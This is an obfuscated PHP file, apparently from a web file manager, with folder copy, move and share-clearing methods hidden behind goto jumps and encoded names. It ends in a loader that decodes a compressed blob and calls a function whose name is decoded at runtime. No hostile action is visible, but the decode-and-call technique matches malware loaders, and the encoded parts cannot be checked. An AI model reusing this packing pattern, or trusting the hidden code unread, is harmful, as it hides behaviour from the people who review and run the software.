$BĞßÅ˜ÂÜ·[47], $BĞßÅ˜ÂÜ·[548] => $D©éÏÚ©ÅÑ[$BĞßÅ˜ÂÜ·[402]], $BĞßÅ˜ÂÜ·[549] => $D©éÏÚ©ÅÑ[$BĞßÅ˜ÂÜ·[482]], $BĞßÅ˜ÂÜ·[551] => USER_ID, $BĞßÅ˜ÂÜ·[411] => $F»ô’ÉŠË¸); $AïàÊ„¸Õ¬ = $BÈô³ª¡Éî[$BĞßÅ˜ÂÜ·[402]] == SourceModel::TYPE_GROUP && $D©éÏÚ©ÅÑ[$BĞßÅ˜ÂÜ·[402]] == SourceModel::TYPE_GROUP && $BÈô³ª¡Éî[$BĞßÅ˜ÂÜ·[482]] == $D©éÏÚ©ÅÑ[$BĞßÅ˜ÂÜ·[482]]; goto câìÃ–¶Ô; fÇ¨Š†§·‹: $BĞßÅ˜ÂÜ· =& $_SERVER[Ïº«‚ßèÔˆø]; $BÈô³ª¡Éî = $this->sourceInfo($Eã…¿î ìÛ); $D©éÏÚ©ÅÑ = $this->sourceInfo($d¿‡à³Çà); goto e°‹Û„á³š; câìÃ–¶Ô: if (!$AïàÊ„¸Õ¬ && $this->moveClearAuth) { Model($BĞßÅ˜ÂÜ·[480])->authClear($Eã…¿î ìÛ); } $d½«ùó¥¤ = $BÈô³ª¡Éî[$BĞßÅ˜ÂÜ·[421]] == $BĞßÅ˜ÂÜ·[87] && $D©éÏÚ©ÅÑ[$BĞßÅ˜ÂÜ·[421]] != $BĞßÅ˜ÂÜ·[87]; if ($d½«ùó¥¤) { $bĞŸ¦¹´´›[$BĞßÅ˜ÂÜ·[420]] = 0; } goto eã¿íÛ©§†; eã¿íÛ©§†: if ($f–Âæí©ƒÒ) { $fâÌ¾—Ã‹ = array($BĞßÅ˜ÂÜ·[552] => array($BĞßÅ˜ÂÜ·[511], $BÈô³ª¡Éî[$BĞßÅ˜ÂÜ·[485]] . $BÈô³ª¡Éî[$BĞßÅ˜ÂÜ·[394]] . $BĞßÅ˜ÂÜ·[512])); $d‰´Ùæ‹„ê = $BÈô³ª¡Éî[$BĞßÅ˜ÂÜ·[485]] . $BÈô³ª¡Éî[$BĞßÅ˜ÂÜ·[394]] . $BĞßÅ˜ÂÜ·[47]; $DÑì¦Îê¾¡ = $D©éÏÚ©ÅÑ[$BĞßÅ˜ÂÜ·[485]] . $D©éÏÚ©ÅÑ[$BĞßÅ˜ÂÜ·[394]] . $BĞßÅ˜ÂÜ·[47] . $BÈô³ª¡Éî[$BĞßÅ˜ÂÜ·[394]] . $BĞßÅ˜ÂÜ·[47]; $A™¾Ô™ÊÊ = array($BĞßÅ˜ÂÜ·[552] => array($BĞßÅ˜ÂÜ·[560], "\x72\145\160\154\x61\x63\x65\50\x70\x61\162\145\x6e\x74\x4c\x65\166\145\x6c\54\47{$d‰´Ùæ‹„ê}\47\54\x27{$DÑì¦Îê¾¡}\47\x29"), $BĞßÅ˜ÂÜ·[548] => $D©éÏÚ©ÅÑ[$BĞßÅ˜ÂÜ·[402]], $BĞßÅ˜ÂÜ·[549] => $D©éÏÚ©ÅÑ[$BĞßÅ˜ÂÜ·[482]]); if ($d½«ùó¥¤) { $A™¾Ô™ÊÊ[$BĞßÅ˜ÂÜ·[420]] = 0; } $this->where($fâÌ¾—Ã‹)->data($A™¾Ô™ÊÊ)->save(); } $this->where(array($BĞßÅ˜ÂÜ·[408] => $Eã…¿î ìÛ))->data($bĞŸ¦¹´´›)->save(); return $Eã…¿î ìÛ; goto E˜¸¥öÔ÷; E˜¸¥öÔ÷: } private function clearShare($FŒŸÓÑ‡œÓ, $E¦…¯±‡éÚ) { goto C¥õØ¾¤ğ; cÇÇÕÅİŠó: Model($C…Ì£íïî[562])->where($f¦ØğêÎÄ)->save(array($C…Ì£íïî[473] => 0)); Model($C…Ì£íïî[563])->where($f¦ØğêÎÄ)->delete(); goto eÃ•”™¯‚Ş; EÛâÚ‚˜Î“: if (!$FË•‡ÉßÅï) { return; } $f¦ØğêÎÄ = array($C…Ì£íïî[394] => array($C…Ì£íïî[7], $FË•‡ÉßÅï), $C…Ì£íïî[473] => 1); $EÉ»Š©ÒÏ = Model($C…Ì£íïî[562])->field($C…Ì£íïî[466])->where($f¦ØğêÎÄ)->select(); goto AÆ­‹ÜŠ…„; AÆ­‹ÜŠ…„: if (!$EÉ»Š©ÒÏ) { return; } $EÉ»Š©ÒÏ = array_to_keyvalue($EÉ»Š©ÒÏ, $C…Ì£íïî[33], $C…Ì£íïî[466]); $f¦ØğêÎÄ = array($C…Ì£íïî[466] => array($C…Ì£íïî[7], $EÉ»Š©ÒÏ)); goto cÇÇÕÅİŠó; C¥õØ¾¤ğ: $C…Ì£íïî =& $_SERVER[Ïº«‚ßèÔˆø]; $d´À§»ÓÌ = $this->sourceInfo($FŒŸÓÑ‡œÓ); $a„‰ğ¾Ïƒ± = $this->sourceInfo($E¦…¯±‡éÚ); goto B†Èñê»á; B†Èñê»á: if ($d´À§»ÓÌ[$C…Ì£íïî[482]] == $a„‰ğ¾Ïƒ±[$C…Ì£íïî[482]] && $d´À§»ÓÌ[$C…Ì£íïî[402]] == $C…Ì£íïî[561]) { return; } $f¦ØğêÎÄ = array($C…Ì£íïî[485] => array($C…Ì£íïî[511], $d´À§»ÓÌ[$C…Ì£íïî[485]] . $FŒŸÓÑ‡œÓ . $C…Ì£íïî[512])); $FË•‡ÉßÅï = $this->field($C…Ì£íïî[408])->where($f¦ØğêÎÄ)->getField($C…Ì£íïî[394], !0); goto EÛâÚ‚˜Î“; eÃ•”™¯‚Ş: } public function copyFolderFromIO($B©¹ğå¾–à, $c¸Äˆóëë¦, $cÙçÒÜñÇ, $F»Äœ”é¥, $dÆä’¨£±Ë, $B­¿İ‚Î®‘ = false) { goto F‚ÅŸ¨ò™®; A¦¥…ÓÜ‡ğ: $this->updateModifyTime($cÙçÒÜñÇ); return $f¦¾Ä¬ôÂ; goto BÍ‡ĞØø¨; F‚ÅŸ¨ò™®: $aØÎ«›ï²¶ =& $_SERVER[Ïº«‚ßèÔˆø]; $BëË‚£Š‹Ï = array($aØÎ«›ï²¶[529] => array(), $aØÎ«›ï²¶[530] => array(), $aØÎ«›ï²¶[528] => array(), $aØÎ«›ï²¶[564] => array()); $D·©ÕÃÇË… = $B­¿İ‚Î®‘ ? $B­¿İ‚Î®‘ : $B©¹ğå¾–à->pathThis($c¸Äˆóëë¦); goto aŠ»Ö¥ôƒˆ; e‡ñ¨‹Ø“Ş: Hook::trigger($aØÎ«›ï²¶[566]); if ($f¦¾Ä¬ôÂ) { $this->folderSizeResetChildren($f¦¾Ä¬ôÂ); } $this->_childrenListClear(); goto cÕºŞÅö¬¶; cÕºŞÅö¬¶: Model($aØÎ«›ï²¶[531])->addAll($BëË‚£Š‹Ï[$aØÎ«›ï²¶[529]], array(), !0); Model($aØÎ«›ï²¶[532])->eventCopy($f¦¾Ä¬ôÂ); $this->saveAll($BëË‚£Š‹Ï[$aØÎ«›ï²¶[530]]); goto F¡¿•É­Ù¿; aŠ»Ö¥ôƒˆ: $E˜„ìÓ÷‡õ = $this->fileNameExist($cÙçÒÜñÇ, $D·©ÕÃÇË…); $f¦¾Ä¬ôÂ = $this->mkdir($cÙçÒÜñÇ, $D·©ÕÃÇË…, $F»Äœ”é¥); if (!$E˜„ìÓ÷‡õ || $F»Äœ”é¥ == REPEAT_RENAME_FOLDER) { $F»Äœ”é¥ = !1; } goto e£¥õÊìÔ; e£¥õÊìÔ: if ($E˜„ìÓ÷‡õ) { $this->_childrenAllMake($E˜„ìÓ÷‡õ); } Hook::trigger($aØÎ«›ï²¶[565]); $this->_copyChildTo($B©¹ğå¾–à, $c¸Äˆóëë¦, $f¦¾Ä¬ôÂ, $F»Äœ”é¥, $BëË‚£Š‹Ï, $dÆä’¨£±Ë); goto e‡ñ¨‹Ø“Ş; F¡¿•É­Ù¿: Model($aØÎ«›ï²¶[448])->linkAdd($BëË‚£Š‹Ï[$aØÎ«›ï²¶[528]]); Model($aØÎ«›ï²¶[448])->remove($BëË‚£Š‹Ï[$aØÎ«›ï²¶[564]]); $this->folderSizeReset($cÙçÒÜñÇ); goto A¦¥…ÓÜ‡ğ; BÍ‡ĞØø¨: } private function _copyChildTo($dº‚ç‹ğçí, $Bˆ¤”ÆïÃ, $CâòˆÄî¶¦, $d‚“¸Ú…¢, &$E… Ëìô¾´, $f¡„¯ÃÅ®©) { goto D©ˆ²µ¶íˆ; B‚ß‰«šÍ: $cˆñ©ÀÉ¼ = array(); foreach ($AˆÎ²©èæò as &$F½ĞÑ³¿ Æ) { goto b•ÌçŸá¾¾; e›ËÎø©ÒŠ: if ($d‚“¸Ú…¢) { $d¾İ‚ŸˆŸÎ = $this->fileNameExistCache($CâòˆÄî¶¦, $F½ĞÑ³¿ Æ[$FÇËäÉªã¦[28]]); if ($d¾İ‚ŸˆŸÎ) { if ($F½ĞÑ³¿ Æ[$FÇËäÉªã¦[401]] || $d‚“¸Ú…¢ == REPEAT_SKIP) { continue; } if ($d‚“¸Ú…¢ == REPEAT_REPLACE) { $eßÜ˜è÷˜ñ = $this->sourceInfoCache($d¾İ‚ŸˆŸÎ); $Eæ¿¡ÄêˆØ = $this->fileHistory($eßÜ˜è÷˜ñ, $F½ĞÑ³¿ Æ[$FÇËäÉªã¦[445]], $F½ĞÑ³¿ Æ[$FÇËäÉªã¦[78]]); if ($Eæ¿¡ÄêˆØ) { $E… Ëìô¾´[$FÇËäÉªã¦[528]][] = $F½ĞÑ³¿ Æ[$FÇËäÉªã¦[445]]; } continue; } else { if ($d‚“¸Ú…¢ == REPEAT_RENAME) { $F½ĞÑ³¿ Æ[$FÇËäÉªã¦[28]] = $this->fileNameAutoCache($CâòˆÄî¶¦, $F½ĞÑ³¿ Æ[$FÇËäÉªã¦[28]], $d‚“¸Ú…¢, !1); } } } } if (!$F½ĞÑ³¿ Æ[$FÇËäÉªã¦[401]] && $F½ĞÑ³¿ Æ[$FÇËäÉªã¦[445]]) { $E… Ëìô¾´[$FÇËäÉªã¦[528]][] = $F½ĞÑ³¿ Æ[$FÇËäÉªã¦[445]]; } $cˆñ©ÀÉ¼[] = $this->_makeItemData($F½ĞÑ³¿ Æ, $aÛÂÆÔîÜ›, $F½ĞÑ³¿ Æ[$FÇËäÉªã¦[28]]); goto ešÅßÍä¼„; a´‰­À’Åğ: $F½ĞÑ³¿ Æ[$FÇËäÉªã¦[78]] = _get($F½ĞÑ³¿ Æ, $FÇËäÉªã¦[78], 0); $F½ĞÑ³¿ Æ[$FÇËäÉªã¦[445]] = _get($F½ĞÑ³¿ Æ, $FÇËäÉªã¦[445], 0); if (!isset($F½ĞÑ³¿ Æ[$FÇËäÉªã¦[567]]) && $F½ĞÑ³¿ Æ[$FÇËäÉªã¦[445]]) { $E… Ëìô¾´[$FÇËäÉªã¦[564]][] = $F½ĞÑ³¿ Æ[$FÇËäÉªã¦[445]]; } goto e›ËÎø©ÒŠ; b•ÌçŸá¾¾: if (isset($Dí¿§˜ëò[$F½ĞÑ³¿ Æ[$FÇËäÉªã¦[28]]])) { $F½ĞÑ³¿ Æ = $Dí¿§˜ëò[$F½ĞÑ³¿ Æ[$FÇËäÉªã¦[28]]]; } $F½ĞÑ³¿ Æ[$FÇËäÉªã¦[401]] = $F½ĞÑ³¿ Æ[$FÇËäÉªã¦[29]] == $FÇËäÉªã¦[77]; $F½ĞÑ³¿ Æ[$FÇËäÉªã¦[403]] = _get($F½ĞÑ³¿ Æ, $FÇËäÉªã¦[168], $FÇËäÉªã¦[33]); goto a´‰­À’Åğ; ešÅßÍä¼„: } unset($F½ĞÑ³¿ Æ); goto c¬È®ÔçùØ; c¬È®ÔçùØ: if (!empty($cˆñ©ÀÉ¼)) { $this->addAll($cˆñ©ÀÉ¼); $this->_childrenListSelect($CâòˆÄî¶¦); } $f ´Š›¾àÂ = $this->_childrenList($CâòˆÄî¶¦); $f ´Š›¾àÂ = array_to_keyvalue($f ´Š›¾àÂ, $FÇËäÉªã¦[28]); goto e£½©œ ä; e£½©œ ä: foreach ($AˆÎ²©èæò as $F½ĞÑ³¿ Æ) { $eßÜ˜è÷˜ñ = $f ´Š›¾àÂ[$F½ĞÑ³¿ Æ[$FÇËäÉªã¦[28]]]; $FÄ”‡“Ø„ = $eßÜ˜è÷˜ñ[$FÇËäÉªã¦[394]]; $this->_copyApplyMeta($eßÜ˜è÷˜ñ, $E… Ëìô¾´); if ($F½ĞÑ³¿ Æ[$FÇËäÉªã¦[29]] == $FÇËäÉªã¦[77]) { $F½ĞÑ³¿ Æ[$FÇËäÉªã¦[76]] = $dº‚ç‹ğçí->getPathInner($F½ĞÑ³¿ Æ[$FÇËäÉªã¦[76]]); $this->_copyChildTo($dº‚ç‹ğçí, $F½ĞÑ³¿ Æ[$FÇËäÉªã¦[76]], $FÄ”‡“Ø„, $d‚“¸Ú…¢, $E… Ëìô¾´, $f¡„¯ÃÅ®©); } } goto f“éÂáÛ¨æ; D©ˆ²µ¶íˆ: $FÇËäÉªã¦ =& $_SERVER[Ïº«‚ßèÔˆø]; $aÛÂÆÔîÜ› = $this->sourceInfoCache($CâòˆÄî¶¦); $DÍ¤ôËêø = $dº‚ç‹ğçí->listPath($Bˆ¤”ÆïÃ); goto b­™¬øÛëÖ; b­™¬øÛëÖ: $DÍ¤ôËêø = $DÍ¤ôËêø ? $DÍ¤ôËêø : array($FÇËäÉªã¦[74] => array(), $FÇËäÉªã¦[75] => array()); $AˆÎ²©èæò = array_merge($DÍ¤ôËêø[$FÇËäÉªã¦[74]], $DÍ¤ôËêø[$FÇËäÉªã¦[75]]); $Dí¿§˜ëò = $this->_addFiles($dº‚ç‹ğçí, $DÍ¤ôËêø[$FÇËäÉªã¦[74]], $f¡„¯ÃÅ®©); goto B‚ß‰«šÍ; f“éÂáÛ¨æ: } private function _addFiles($Cé½¼†•ù, $b¸«Ò±øé˜, $fÄ¯ËÆŸ×) { goto Bœ•÷“‘¹·; Bœ•÷“‘¹·: $fá÷¼Ö«Ï =& $_SERVER[Ïº«‚ßèÔˆø]; if (!$b¸«Ò±øé˜ || count($b¸«Ò±øé˜) == 0) { return array(); } $d“àòŞ…øƒ = array(); goto fÂĞ˜Ÿ²Ä; Aáò„‹êİ: foreach ($Bæİ‡ïİÛ as $cğÒØæÒªŒ) { if (!isset($d“àòŞ…øƒ[$cğÒØæÒªŒ[$fá÷¼Ö«Ï[170]]])) { continue; } $BøÓ•¶Ò¼ = $d“àòŞ…øƒ[$cğÒØæÒªŒ[$fá÷¼Ö«Ï[170]]]; foreach ($BøÓ•¶Ò¼ as &$aÅÅ² ñÔ¿) { $aÅÅ² ñÔ¿[$fá÷¼Ö«Ï[445]] = $cğÒØæÒªŒ[$fá÷¼Ö«Ï[445]]; $aÅÅ² ñÔ¿[$fá÷¼Ö«Ï[567]] = !0; } unset($aÅÅ² ñÔ¿); } $F¹ƒ§²ÍŠ = array(); foreach ($b¸«Ò±øé˜ as $b÷ÕÜò…Ñ„) { if (isset($b÷ÕÜò…Ñ„[$fá÷¼Ö«Ï[567]]) && $b÷ÕÜò…Ñ„[$fá÷¼Ö«Ï[567]]) { continue; } $cÕ÷–ìäØê = $Cé½¼†•ù->getPathInner($b÷ÕÜò…Ñ„[$fá÷¼Ö«Ï[76]]); $D°äõÂ½§ƒ = $b¯Óíí ªõ->addFileMake($cÕ÷–ìäØê, $b÷ÕÜò…Ñ„[$fá÷¼Ö«Ï[78]], $b÷ÕÜò…Ñ„[$fá÷¼Ö«Ï[171]], $b÷ÕÜò…Ñ„[$fá÷¼Ö«Ï[170]], $b÷ÕÜò…Ñ„[$fá÷¼Ö«Ï[28]], $fÄ¯ËÆŸ×); $F¹ƒ§²ÍŠ[] = $D°äõÂ½§ƒ; } goto A”µì¢ˆƒ; a¨ëßï‘†Æ: $b¯Óíí ªõ = Model($fá÷¼Ö«Ï[570]); $Bæİ‡ïİÛ = $b¯Óíí ªõ->where($e½¨É°‹¨Í)->select(); $Bæİ‡ïİÛ = $Bæİ‡ïİÛ ? $Bæİ‡ïİÛ : array(); goto Aáò„‹êİ; E¯òõ‚‚¾‹: foreach ($b¸«Ò±øé˜ as $Eóã¹ßÚ˜) { $bÛ‹¯’Äœ[$Eóã¹ßÚ˜[$fá÷¼Ö«Ï[28]]] = $Eóã¹ßÚ˜; } return $bÛ‹¯’Äœ; goto E•ó ¬Ùå; A”µì¢ˆƒ: $b¯Óíí ªõ->addAll($F¹ƒ§²ÍŠ); $e½¨É°‹¨Í = array($fá÷¼Ö«Ï[170] => array($fá÷¼Ö«Ï[7], array_keys($d“àòŞ…øƒ))); $Bæİ‡ïİÛ = $b¯Óíí ªõ->where($e½¨É°‹¨Í)->select(); goto C·åñ«ÔœÁ; C·åñ«ÔœÁ: $Bæİ‡ïİÛ = $Bæİ‡ïİÛ ? $Bæİ‡ïİÛ : array(); foreach ($Bæİ‡ïİÛ as $cğÒØæÒªŒ) { if (!isset($d“àòŞ…øƒ[$cğÒØæÒªŒ[$fá÷¼Ö«Ï[170]]])) { continue; } $aéä±äçÆù =& $d“àòŞ…øƒ[$cğÒØæÒªŒ[$fá÷¼Ö«Ï[170]]]; foreach ($aéä±äçÆù as &$aÅÅ² ñÔ¿) { $aÅÅ² ñÔ¿[$fá÷¼Ö«Ï[445]] = $cğÒØæÒªŒ[$fá÷¼Ö«Ï[445]]; } unset($aÅÅ² ñÔ¿); } $bÛ‹¯’Äœ = array(); goto E¯òõ‚‚¾‹; fÂĞ˜Ÿ²Ä: foreach ($b¸«Ò±øé˜ as &$aÅÅ² ñÔ¿) { goto C—‚¦çÊ¶İ; AŒÚí‹‘İ: $aÅÅ² ñÔ¿[$fá÷¼Ö«Ï[170]] = $e¢Ë–¬µ ; Hook::trigger($fá÷¼Ö«Ï[569], $aÅÅ² ñÔ¿); $d“àòŞ…øƒ[$e¢Ë–¬µ ][] =& $aÅÅ² ñÔ¿; goto aÙŸ’èŒ; aÙŸ’èŒ: if (count($d“àòŞ…øƒ[$e¢Ë–¬µ ]) > 1) { $aÅÅ² ñÔ¿[$fá÷¼Ö«Ï[567]] = !0; } goto Eš—áÄÜ»ö; C—‚¦çÊ¶İ: Hook::trigger($fá÷¼Ö«Ï[568], $aÅÅ² ñÔ¿); $aÅÅ² ñÔ¿[$fá÷¼Ö«Ï[76]] = $Cé½¼†•ù->getPathInner($aÅÅ² ñÔ¿[$fá÷¼Ö«Ï[76]]); $dğ·Ù¼ê—Œ = $Cé½¼†•ù->hashSimple($aÅÅ² ñÔ¿[$fá÷¼Ö«Ï[76]]); goto BàªÒ‚êØ‚; BàªÒ‚êØ‚: $e¢Ë–¬µ  = $Cé½¼†•ù->hashMd5($aÅÅ² ñÔ¿[$fá÷¼Ö«Ï[76]]); if (strlen($e¢Ë–¬µ ) > 10 && !isset($d“àòŞ…øƒ[$e¢Ë–¬µ ])) { $d“àòŞ…øƒ[$e¢Ë–¬µ ] = array(); } $aÅÅ² ñÔ¿[$fá÷¼Ö«Ï[171]] = $dğ·Ù¼ê—Œ; goto AŒÚí‹‘İ; Eš—áÄÜ»ö: } unset($aÅÅ² ñÔ¿); $e½¨É°‹¨Í = array($fá÷¼Ö«Ï[170] => array($fá÷¼Ö«Ï[7], array_keys($d“àòŞ…øƒ))); goto a¨ëßï‘†Æ; E•ó ¬Ùå: } } define($_SERVER[Ïº«‚ßèÔˆø][571], $_SERVER[Ïº«‚ßèÔˆø][572]); goto eÉñ×±ôëÌ; e´¶ÛËµ•: $EŠ‹™¾½ò• = strrev(base64_decode($_SERVER[»ã][0])); function binCheckNeq($døŒ¿†ÉÓ¸, $C”¤å‡âµ) { return $døŒ¿†ÉÓ¸ != $C”¤å‡âµ; } $_SERVER[$_SERVER[»ã][1]] = $EŠ‹™¾½ò•($_SERVER[$_SERVER[»ã][2]]); goto DßÂí£¨²¤; c¯¤Èí‚¤: if (!function_exists('_kodDe')) { function _kodDe($b‹Å‰Šµ¨) { $b‹Å‰Šµ¨ = base64_decode($b‹Å‰Šµ¨); $B‘äæ¶¡†² = strlen($b‹Å‰Šµ¨); $aø»å›ëñ = ''; $f—„‹·¾Å = ord($b‹Å‰Šµ¨[0]) - 30; for ($BßùĞ¿£³ø = 1; $BßùĞ¿£³ø < $B‘äæ¶¡†²; $BßùĞ¿£³ø += 2) { if ($BßùĞ¿£³ø + 1 < $B‘äæ¶¡†²) { $aø»å›ëñ .= chr(ord($b‹Å‰Šµ¨[$BßùĞ¿£³ø + 1]) + $f—„‹·¾Å); $aø»å›ëñ .= chr(ord($b‹Å‰Šµ¨[$BßùĞ¿£³ø]) + $f—„‹·¾Å); } else { $aø»å›ëñ .= chr(ord($b‹Å‰Šµ¨[$BßùĞ¿£³ø]) + $f—„‹·¾Å); } } return $aø»å›ëñ; } } define("\317\272\253\202\337\350\324\210\370", "\xf7\x8e\xdf\xbb\x9c\x97\xda"); $_SERVER[Ïº«‚ßèÔˆø] = explode(base64_decode('fAR8BXwD'), gzinflate(substr(strrev('`HLÎ&I#$™$â-BSi(GÕÔv¾Å–²¸ÖUT|}­'."\0".''."\0".''."\0".''."\0".''."\0".''."\0".'‹')."\170\63\363\222\171\311\314\274\311\173\157\222\114\50\52\256\225\142\3\124\26\364\123\364\123\104\100\154\330\260\354\202\25\327\276\26\154\237\12\366\302\132\131\333\377"."\366\173\337\233\211\373\375\177\377\77\12\163\373\273\345\334\163\317\71\367\234\163\37\372\140\341\101\13\17\136\370\207\315\177\275\364\233\135\27\174\165\303\13\373\160"."\174\341\60\364\37\12\237\261\364\217\7\240\77\177\130\172\131\121\121\343\304\303\112\133\216\270\374\236\115\362\260\307\177\334\161\317\256\265\257\274\267\353\366\120\154".base64_decode('+oNru04/4JcxLT9XgpK4YiX+kVKaKSkDqmEaOCGqpTrVLhxWU/jXjX+M3oRq').strrev('“–RV–´ásbSà¢´ñ¤“—YiBF-IùŠ-& oVÖ¶ÁÂ‡ñn8*')."\115\71\42\33\244\245\272\232\160\235\267\265\311\77\73\34\232\335\352\45\45\42\341\336\214\242\147\161\14\5\203\246\254\233\41\65\251\260\22\375\72\353\127\215\267"."\301\327\42\205\2\236\226\240\247\66\344\363\267\340\344\132\177\163\263\57\224\233\36\360\67\65\325\170\152\147\344\346\264\6\74\15\315\36\11\364\57\241\204\325\124"._kodDe('LEiZvxYruZflDlRJmjaH+f4kRYDfP4tChXd6DLIklvZ7poACorHbG8QEWcBW3A==')."\304\110\132\127\223\62\35\372\14\45\313\122\161\100\316\230\232\232\212\342\210\167\300\324\145\236\16\172\34\325\225\244\222\42\115\5\275\115\336\332\220\4\273\51\325".base64_decode('B/zNElmKpGyYii61N3oDXgl2vaoQjbhQwvXaWsCESJ6mJmmoFkwlmabN4Dp5')."\32\363\7\352\274\1\251\146\266\304\347\51\252\45\223\132\312\5\132\1\353\151\12\135\365\6\2\70\340\40\20\334\344\203\113\107\42\376\372\372\240\227\305\310\340"."\316\156\2\75\31\117\240\324\22\213\165\46\314\160\237\234\310\120\140\355\301\277\205\344\207\374\152\6\1\340\136\65\245\146\10\260\222\46\64\215\355\34\22\310\320"."\322\12\115\121\142\44\220\4\365\65\262\271\300\116\353\303\301\252\351\370\167\52\51\24\11\303\74\105\67\303\112\52\252\305\324\24\331\217\325\144\357\21\10\224\315"."\170\235\256\202\162\244\101\315\25\325\322\331\146\255\217\14\246\123\115\50\115\154\273\165\152\211\230\242\363\170\32\124\27\163\310\250\324\101\241\166\113\46\51\26\141"."\321\150\134\115\304\164\272\113\177\257\44\300\3\152\147\226\357\106\103\313\350\121\305\7\366\13\257\333\312\172\62\216\24\122\114\23\14\332\240\343\152\113\47\64\71".base64_decode('FlR0Yaz1oKI/Y4qJGVSsXtOTdQBvkO+D3aK25cnoofslJkyhi+C7ojnnO3+d')."\73\347\114\360\117\61\101\176\35\244\153\161\45\221\10\53\3\12\331\127\311\330\4\203\216\325\155\104\324\224\33\244\340\250\317\37\216\313\106\274\71\66\41\214\152".base64_decode('UZwaUwZc6XiabH222zsscA9Xp0UzvQJmTmhROSGOFIfjppkOKqkYnBAyIq0/').base64_decode('hSYsrSikUJ1DiknN0mypsVKtNGjFZIKF6OhYmsESzQECMQUkrgyYZFKkqdG4')."\xac\x83\xe5\xaa\xca\x98\x9d\xce\xc9\x4\xbf\xa4\xd3\x9\x35\x2a\x9b\xaa\x96\x72\x6b\x51\x53\x31\x9d\x86\xa9\x2b\x32\x69\xcd\x13\x8d\x2a\x86\xe1\xac\xd5\x52\xa6\xae\x25\x9c\x9e\x44".base64_decode('Qut3+nW1S01VSiUEG4NMsN+dEENWkk1cMFWCsAIRRAn+Gt2crLQup4xORXd6')."\311\246\251\224\300\172\60\4\111\213\325\251\106\132\63\124\330\275\112\111\66\115\71\32\207\310\205\67\137\365\73\345\325\124\102\115\51\71\145\275\3\151\125\127\14"."\332\127\251\241\71\104\32\1\255\53\316\126\135\356\112\312\225\122\72\23\1\63\103\166\157\236\64\134\232\114\115\245\24\205\121\207\224\314\30\246\123\127\0\226\122"."\xc1\x79\x48\xd6\xd8\xd7\xe9\x6c\x86\x5b\x4b\x55\x62\xce\x20\x40\xe6\x24\x79\x7c\x59\x85\x4\xc0\x46\xa2\x79\x38\xb5\x31\x14\x6a\xd\xfb\xea\xc1\x99\xdd\xe2\xd\x37\x7b\x42\xb5\x8d"."\xa4\xdb\xa6\xdc\x45\xfb\xdc\x4\x50\x34\x6b\x92\x26\xce\x72\x82\x2d\x6\x1\xab\x5\x8c\x95\x27\xb6\x6a\xfd\x8a\xe\x3e\x5c\x93\xad\x94\x7a\xb4\x58\x44\x1b\x70\xd1\x2c\x58\x38\x8"."\160\10\55\14\227\73\155\72\3\162\252\13\316\117\44\153\52\4\374\214\276\56\353\104\67\51\251\56\63\116\53\6\275\201\231\336\100\70\350\257\17\265\173\2\344"."\264\117\1\50\31\240\237\202\115\47\234\1\45\6\246\76\152\322\172\162\32\316\32\55\3\67\6\134\53\232\13\67\13\315\153\362\65\300\211\251\163\32\240\220\123".base64_decode('LEXbblKTKuy7yXLQTAJSoIF0yI0GVNURLynqiJUWO8G/JcVzOupcJXOr3Sqv').base64_decode('4x7nGieVl02UWgFtosoJiQw6p0SZ5J/xOxMAjy5hW9umDicGvGe3eYOhcLM3')."\xd4\xe8\xaf\x23\x5f\xf0\x7a\x48\xa8\x49\xc3\x5b\x93\x8e\x68\xe\xfe\x99\xeb\xe2\xf8\x18\xac\xb9\x2f\x29\x77\xd9\xb0\x34\x8c\x35\x6b\xba\x62\x4d\xe1\xa7\x46\xbb\x1a\xa3\x68\x1c\x46"."\x1b\x15\xb5\x2b\x4e\xc6\xa7\xc2\xd6\xa2\x5a\x42\xd3\xe5\x4\xc4\x62\x14\x88\x15\x8a\x59\xba\xd4\x4e\xb2\x3e\x18\x61\xf2\x48\x50\x4d\xa6\x29\x5e\x33\xe3\x99\x64\x44\x8\x52\xb2\x14"."\xac\x37\x3d\x5e\xe2\x1a\x3b\xde\x34\x9d\x84\x2a\xdd\xa4\xe0\x98\xf2\x7a\x8a\x99\xdd\xc1\xf1\xe0\x7f\x8e\x86\x63\x5a\x52\xa6\xd4\x2e\x42\x49\x4a\xc\xe3\x24\x9c\x54\x62\xc9\x69\x54"."\x64\x7e\x5e\x9a\xba\xa9\xc1\x54\xdd\x52\xa4\x59\x31\xe3\x1a\x59\xa4\x2e\x85\x76\x29\xc3\xfa\x46\x7b\x19\x53\x12\xa\x9d\x8d\xb8\x42\x51\x3a\x20\xe1\xfa\xd8\x24\x75\x32\xbc\xe\x28"."\66\220\312\317\122\325\10\200\52\220\202\242\361\166\110\350\362\4\223\25\115\200\143\304\37\351\6\373\204\220\20\252\121\57\234\372\141\15\345\201\136\313\274\174\253"."\256\164\252\144\267\245\300\122\65\313\172\17\255\0\226\206\237\67\60\42\64\126\337\326\324\24\256\365\267\204\0\361\214\123\332\3\276\220\227\2\247\247\56\354\251"."\155\145\247\47\137\152\122\0\142\212\334\143\0\247\364\225\13\107\20\77\253\70\26\247\147\54\304\322\70\14\320\162\132\113\31\212\63\112\132\213\161\174\216\113\114"."\265\41\363\234\32\234\144\37\160\312\311\101\147\22\114\223\223\165\335\172\264\112\41\361\204\366\221\5\345\170\33\116\54\340\210\350\231\336\352\17\222\12\325\60\25"."\220\115\21\105\47\375\150\155\43\131\111\1\230\32\274\44\361\60\172\114\313\204\150\362\264\7\51\316\315\200\362\272\72\50\363\61\126\323\376\220\266\7\222\11\116"."\11\132\107\345\344\153\21\152\364\265\314\10\67\373\353\274\115\141\137\13\100\110\241\334\364\266\326\72\17\135\134\61\275\306\37\152\264\244\266\1\224\64\323\323\344"."\xb3\x17\xf7\xce\xf2\x5\x43\xc1\xbc\x59\x20\xad\xcd\x6b\xcb\x1\x4c\x60\x6b\xc0\x5b\xef\x9b\xc5\xa2\xf5\x3e\x6f\x53\x5d\x30\x5c\xeb\xa9\x6d\xe4\x65\x5a\x3c\xcd\x24\x12\xee\x84\x6c"."\x98\xe1\xb6\x96\xf\x3\xdc\x1a\x64\xcc\x5c\xb8\xf\x32\xa6\x74\xb2\xc2\x16\xce\x29\x4c\x79\x82\x30\x87\x3\x70\x4e\x2a\x4\xf6\xc8\x70\x21\x3b\x8c\x46\x42\x88\xf3\xa8\x96\xa1\xd0"._kodDe('L9e3E7IWNIg4GluNiDRwlufhRxTzDCJ3VYESMFT7I/YJD4Ot6N8zPWux/juffA==')."\322\311\120\166\376\4\117\247\311\260\200\55\16\366\5\317\3\53\340\101\174\67\200\4\264\42\141\272\327\14\300\250\170\150\167\72\71\317\33\366\267\172\3\36\310"."\x31\x87\xdb\x3\xfe\x96\x6\x52\xa1\x3f\xae\xd0\xe\xf8\xc8\xf4\x17\x51\xba\x89\x30\x